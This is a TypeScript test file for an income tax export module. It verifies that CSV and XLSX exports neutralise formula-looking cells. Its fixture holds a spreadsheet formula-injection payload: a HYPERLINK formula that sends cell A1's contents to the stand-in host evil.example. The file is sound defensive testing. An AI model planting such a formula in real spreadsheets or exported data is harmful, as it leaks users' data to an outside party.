import * as xlsx from 'xlsx';
import { buildIncomeTaxCsv, buildIncomeTaxXlsx } from '@/modules/income-tax/income-tax-document';
import type { IncomeTaxDraft } from '@/modules/income-tax/income-tax.types';

const VENDOR = '=HYPERLINK("http://evil.example/?"&A1,"x")';

const DRAFT = {
  taxYear: 2025,
  status: 'draft',
  finalizedAt: null,
  country: { code: 'DE', name: 'Germany' },
  currency: 'EUR',
  taxpayerType: 'self_employed',
  details: {},
  pack: {
    formKey: 'de-euer',
    name: 'EÜR',
    countryCode: 'DE',
    formEditionYear: 2025,
    filingChannel: null,
    isGeneric: false,
  },
  lines: [],
  figures: [],
  warnings: [],
  taxEstimate: null,
  completeness: { score: 100, issues: [] },
  disclaimerVersion: '1',
  fxRule: 'transaction_date',
  filingInfo: null,
  contributions: {
    revenue: [
      {
        transactionId: 'tx-1',
        date: '2025-03-01',
        counterparty: VENDOR,
        categoryName: '@Category',
        currency: 'EUR',
        amount: 100,
        exchangeRate: 1,
        amountConverted: 100,
      },
    ],
  },
} as unknown as IncomeTaxDraft;

describe('income tax documents', () => {
  it('neutralises formula-looking counterparty and category cells in XLSX', () => {
    const book = xlsx.read(buildIncomeTaxXlsx(DRAFT), { type: 'buffer' });
    const [row] = xlsx.utils.sheet_to_json<Record<string, unknown>>(book.Sheets.Transactions);

    expect(row.Counterparty).toBe(`'${VENDOR}`);
    expect(row.Category).toBe("'@Category");
  });

  it('neutralises them in CSV too', () => {
    const csv = buildIncomeTaxCsv(DRAFT).toString('utf8');

    expect(csv).toContain(`"'=HYPERLINK(""http://evil.example/?""&A1,""x"")"`);
    expect(csv).toContain("'@Category");
  });
});
